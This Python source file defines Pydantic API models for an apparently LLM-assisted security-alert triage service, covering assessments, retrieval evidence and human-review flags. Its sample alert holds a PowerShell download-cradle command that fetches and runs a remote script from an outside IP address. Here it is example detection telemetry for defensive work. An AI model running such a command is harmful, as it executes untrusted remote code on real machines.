"""Request and response models for the HTTP API.

These are the API's contract, kept separate from the internal engine models:
`AnalysisResult` is what the engine produces, `AnalysisResponse` is what
clients see (alert + assessment + retrieval + metadata). Examples here feed
straight into the Swagger docs at `/docs`.
"""
from __future__ import annotations

from datetime import datetime
from typing import Any

from pydantic import BaseModel, ConfigDict, Field, model_validator

from app.rag.schemas import RetrievalStatus
from app.schemas.alert import Alert, AlertCategory, Severity
from app.schemas.analysis import Classification, KnowledgeReference

# Alert telemetry fields that may be sent flat at the top level of an
# analyze request (everything except the two "lookup" fields).
_FLAT_ALERT_FIELDS = set(Alert.model_fields) - {"alert_id", "description"}

_EXAMPLE_ALERT: dict[str, Any] = {
    "alert_id": "ALRT-1003",
    "timestamp": "2025-09-13T22:05:19Z",
    "hostname": "SRV-APP-02",
    "username": "SYSTEM",
    "source_ip": "10.30.2.15",
    "process": "powershell.exe",
    "command_line": (
        "powershell.exe -Command \"IEX (New-Object Net.WebClient)"
        ".DownloadString('http://185.220.101.44/a.ps1')\""
    ),
    "severity": "critical",
    "category": "PowerShell Execution",
    "description": "Classic download-cradle executing a remote script in memory.",
}


# --- requests -----------------------------------------------------------------

class AnalyzeAlertRequest(BaseModel):
    """Two ways to ask for an analysis:

    1. **By ID** — `{"alert_id": "ALRT-1003"}`. The full alert is loaded from
       the database. A `description` may be sent alongside it for readability,
       but the stored record stays authoritative.
    2. **By payload** — a complete alert, either nested under `alert` or sent
       flat at the top level. Used for alerts that are not in the dataset.
    """

    model_config = ConfigDict(
        extra="forbid",
        json_schema_extra={
            "examples": [
                {"alert_id": "ALRT-1003",
                 "description": "Encoded PowerShell execution detected"},
                {"alert": _EXAMPLE_ALERT},
            ]
        },
    )

    alert_id: str | None = Field(default=None, min_length=1, max_length=64)
    description: str | None = Field(default=None, max_length=4000)
    alert: Alert | None = Field(default=None, description="Complete alert payload.")

    @model_validator(mode="before")
    @classmethod
    def _accept_flat_alert(cls, data: Any) -> Any:
        # A complete alert sent flat is repacked under `alert` so there is one
        # internal shape. Partial telemetry still fails Alert validation with a
        # precise list of missing fields.
        if isinstance(data, dict) and "alert" not in data:
            if _FLAT_ALERT_FIELDS & set(data):
                return {"alert": dict(data)}
        return data

    @model_validator(mode="after")
    def _require_identifier_or_payload(self) -> AnalyzeAlertRequest:
        if self.alert is None and not self.alert_id:
            raise ValueError("provide either 'alert_id' or a complete alert payload")
        if self.alert is not None and self.alert_id and self.alert_id != self.alert.alert_id:
            raise ValueError("'alert_id' does not match 'alert.alert_id'")
        return self


# --- analysis response --------------------------------------------------------

class KnowledgeDocument(BaseModel):
    """One retrieved knowledge chunk, with its similarity score."""

    chunk_id: str
    doc_name: str
    title: str
    category: str
    source: str
    score: float
    excerpt: str


class RetrievalBlock(BaseModel):
    status: RetrievalStatus = Field(
        description="'relevant' (evidence retrieved), 'insufficient' (retrieval ran, "
                    "nothing was relevant) or 'failed' (the knowledge base could not "
                    "be consulted).",
    )
    sufficient: bool = Field(description="False when no usable evidence was retrieved.")
    note: str
    documents: list[KnowledgeDocument]
    similarity_scores: list[float] = Field(
        description="Scores of `documents`, in the same order."
    )
    cited_chunk_ids: list[str] = Field(
        description="Chunks the model actually relied on (verified against retrieval)."
    )


class Assessment(BaseModel):
    classification: Classification
    risk_score: int = Field(ge=0, le=100)
    confidence_score: int = Field(ge=0, le=100)
    reasoning: str
    recommended_action: str
    evidence: list[str]
    unsupported_claims: list[str]
    retrieved_knowledge: list[KnowledgeReference]
    knowledge_sufficient: bool
    human_review_required: bool
    human_review_reasons: list[str]
    validation_warnings: list[str]
    advisory_notice: str


class AnalysisMeta(BaseModel):
    analysis_id: int | None = Field(default=None, description="DB id, null if not persisted.")
    analyzed_at: datetime
    provider: str
    model: str
    prompt_version: str
    attempts: int
    latency_ms: int
    persisted: bool
    cached: bool = Field(
        default=False, description="True when served from a stored analysis, not a fresh run."
    )
    notes: list[str] = Field(default_factory=list)


class AnalysisResponse(BaseModel):
    alert: Alert
    assessment: Assessment
    retrieval: RetrievalBlock
    meta: AnalysisMeta


# --- alert listing ------------------------------------------------------------

class AlertOut(Alert):
    """An alert plus a summary of its latest assessment, if any."""

    has_analysis: bool = False
    latest_classification: Classification | None = None
    latest_risk_score: int | None = None
    latest_analyzed_at: datetime | None = None


class AlertListResponse(BaseModel):
    total: int = Field(description="Total matching alerts, ignoring pagination.")
    limit: int
    offset: int
    items: list[AlertOut]


class AlertFilters(BaseModel):
    severity: Severity | None = None
    category: AlertCategory | None = None


# --- operational --------------------------------------------------------------

class ReindexResponse(BaseModel):
    status: str = "ok"
    documents: int
    chunks: int
    duration_ms: int


class ErrorDetail(BaseModel):
    code: str = Field(description="Stable, machine-readable error code.")
    message: str
    request_id: str | None = None
    details: list[dict] | None = None


class ErrorResponse(BaseModel):
    model_config = ConfigDict(
        json_schema_extra={
            "example": {
                "error": {
                    "code": "alert_not_found",
                    "message": "No alert with id 'ALRT-9999'.",
                    "request_id": "3f6c1b9a2d4e5f70",
                }
            }
        }
    )

    error: ErrorDetail
